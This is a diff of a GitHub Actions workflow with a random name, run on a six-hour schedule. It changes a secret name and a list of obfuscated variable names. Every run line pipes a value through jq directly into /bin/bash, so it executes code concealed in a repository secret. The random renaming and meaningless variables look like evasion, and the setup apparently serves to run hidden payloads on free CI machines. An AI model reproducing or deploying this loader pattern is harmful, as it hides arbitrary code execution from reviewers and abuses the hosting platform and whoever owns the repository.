@@ -1,9 +1,11 @@
 name: qiantulong4756
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 3/6 * * *'
-jobs:  # 25717
+    - cron: '49 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,17 +13,19 @@ jobs:  # 25717
       - uses: actions/checkout@v4
       - name: qiantulong4756
         env:
-          vmnlh895: ${{ secrets.vmnlh895 }}
+          dzxe2648: ${{ secrets.dzxe2648 }}
         run: |
-          echo $vmnlh895 | jq -r .bhmlo3 | /bin/bash
-          echo $k2126 | jq -r .en58 | /bin/bash
-          echo $zsdt91298 | jq -r .j96927 | /bin/bash
-          echo $h586 | jq -r .t70117 | /bin/bash
-          echo $pvb4630 | jq -r .uh4128 | /bin/bash
-          echo $ya51483 | jq -r .k40 | /bin/bash
-          echo $d22749 | jq -r .tc2 | /bin/bash
-          echo $pbti7792 | jq -r .yf72 | /bin/bash
-          echo $rsvo5 | jq -r .g657 | /bin/bash
-          echo $bx3961 | jq -r .grhk0 | /bin/bash
-          echo $ubafg72 | jq -r .v284 | /bin/bash
+          echo $dzxe2648 | jq -r .idqq404 | /bin/bash
+          echo $n032 | jq -r .rv3 | /bin/bash
+          echo $i18896 | jq -r .x7592 | /bin/bash
+          echo $aahg66075 | jq -r .pl3 | /bin/bash
+          echo $zq73273 | jq -r .wzns4930 | /bin/bash
+          echo $vdo73 | jq -r .l6513 | /bin/bash
+          echo $ys21 | jq -r .cuvdp74011 | /bin/bash
+          echo $ngi4 | jq -r .jwhv0 | /bin/bash
+          echo $fdga18 | jq -r .oxd3 | /bin/bash
+          echo $gchg2974 | jq -r .hqlvc88 | /bin/bash
+          echo $rvfq9079 | jq -r .qgoj63311 | /bin/bash
+          echo $cjeyz30980 | jq -r .x5 | /bin/bash
+          echo $w05270 | jq -r .lmqwd4 | /bin/bash
 
